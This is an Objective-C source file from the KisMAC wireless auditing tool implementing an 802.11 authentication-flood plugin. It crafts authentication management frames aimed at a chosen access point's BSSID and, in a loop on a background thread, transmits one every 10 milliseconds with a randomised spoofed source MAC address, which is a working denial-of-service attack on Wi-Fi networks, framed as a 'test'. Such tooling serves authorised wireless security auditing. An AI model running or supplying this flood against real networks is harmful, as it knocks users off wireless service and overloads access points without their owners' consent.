//
//  WavePluginAuthenticationFlood.m
//  KisMAC
//
//  Created by pr0gg3d on 28/12/08.
//  Copyright 2008 __MyCompanyName__. All rights reserved.
//

#import "WavePluginAuthenticationFlood.h"
#import "WavePacket.h"
#import "WaveNet.h"
#import "WaveDriver.h"
#import "../Core/80211b.h"

@implementation WavePluginAuthenticationFlood

- (bool) startTest:(WaveNet*)net {
    
    KFrame *kframe = &_authFrame;
    struct ieee80211_auth *frame = (struct ieee80211_auth *)(kframe->data);
        
    if ([net type]!= networkTypeManaged)
        return NO;
    
    _status = WavePluginRunning;
    _stopFlag = NO;
    
    memset(kframe, 0, sizeof(KFrame));
    
    frame->header.frame_ctl = IEEE80211_TYPE_MGT | IEEE80211_SUBTYPE_AUTH;
    
    memcpy(frame->header.addr1, [net rawBSSID], 6);
    memcpy(frame->header.addr3, [net rawBSSID], 6);
    
    frame->algorithm = 0;
    frame->transaction = NSSwapHostShortToLittle(1);
    frame->status = 0;
    
    frame->header.seq_ctl=random() & 0x0FFF;
    
    kframe->ctrl.len = sizeof(struct ieee80211_auth);
    kframe->ctrl.tx_rate = [_driver currentRate];
    
    [NSThread detachNewThreadSelector:@selector(doAuthFloodNetwork:)
							 toTarget:self
						   withObject:nil];
	
    return YES;
}

- (void)doAuthFloodNetwork: (id)o {
    @autoreleasepool {
        UInt16 x[3];
        
        KFrame *kframe = &_authFrame;
        struct ieee80211_auth *frame = (struct ieee80211_auth *)(kframe->data);
        
        while (_stopFlag == NO) {
            x[0] = random() & 0x0FFF;
            x[1] = random();
            x[2] = random();
            
            memcpy(frame->header.addr2, x, 6); //needs to be random
            
            [_driver sendKFrame:kframe howMany:1 atInterval:0];
            [NSThread sleepUntilDate:[NSDate dateWithTimeIntervalSinceNow:0.01]];
        }
    
    }
    _status = WavePluginIdle;

    return;
}

- (bool) stopTest {
    _stopFlag = YES;
    return YES;
}
@end
